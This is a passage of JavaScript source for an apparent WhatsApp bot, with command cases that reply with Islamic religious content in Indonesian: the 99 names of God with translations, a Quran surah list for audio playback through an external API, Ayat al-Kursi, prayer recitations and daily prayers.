        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return replygcxeon (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return replygcxeon(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    replygcxeon(`${contoh} + ${data} + ${anjuran}`)
}
break
//=========================================\\
case 'audiosurah': {
	let wrong = `_*Contoh Penggunaan :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return replygcxeon(`${wrong}`)
      reply(mess.wait)
   XeonBotInc.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=Elaina` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break
//=========================================\\

case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  replygcxeon(caption)
}
break
//=========================================\\
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    replygcxeon(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
    let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replygcxeon(`${caption}`)

}
break
//=========================================\\
case 'assalamualaikum': 
case 'assalamualaikum wr. wb.': 
case 'assalamualaikum wr wb': {
    let caption = `*Waalaikummussalam warahmatullahi wabarokatuh*


_📚 Baca yang dibawah ya!_
